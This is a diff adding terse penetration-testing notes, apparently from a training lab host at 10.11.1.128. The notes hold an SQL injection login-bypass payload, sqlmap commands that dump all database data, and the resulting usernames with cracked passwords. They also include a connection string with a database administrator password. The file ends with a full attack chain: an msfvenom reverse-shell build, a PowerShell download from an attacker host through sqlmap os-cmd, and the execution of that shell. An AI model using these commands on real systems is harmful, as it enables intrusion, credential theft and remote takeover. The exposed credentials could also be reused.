@@ -1,0 +1,32 @@
+Foxit Reader 9.0.1.1049 - Remote Code Execution https://www.exploit-db.com/exploits/44941
+
+http://10.11.1.128:4167/login.asp
+
+Password parameter vulnereble to SQLi
+bypass login: a' or 'a'='a
+
+sqlmap -r request --risk 3 --level 5 --dump-all
++------+----------------------------------+--------+
+| id   | pass                             | name   |
++------+----------------------------------+--------+
+| 0    | 5f4dcc3b5aa765d61d8327deb882cf99 | alice  |
+| 1    | 34819d7beeabb9260a5c854bc85b3e44 | brett  |
+| 2    | 7d9264f1c1c042b799ef08da95a782d4 | peter  |
+| 3    | 123pass123                       | eric   |
++------+----------------------------------+--------+
+
+alice: password
+brett: mypassword
+peter: 123pass123
+eric: 123pass123
+
+loginform.asp
+
+ConnString="DRIVER={SQL Server}; SERVER=localhost; UID=sa; PWD=dfkjdf7893242dfgDFG; DATABASE=music"
+
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f exe > reverseshell.exe
+
+sqlmap -r request --level 5 --risk 3 --os-cmd="powershell Invoke-WebRequest -Uri http://IP/reverseshell.exe -OutFile C:\Windows\Temp\reverseshell.exe -UseBasicParsing"
+
+sqlmap -r request --level 5 --risk 3 --os-cmd="C:\Windows\Temp\reverseshell.exe"
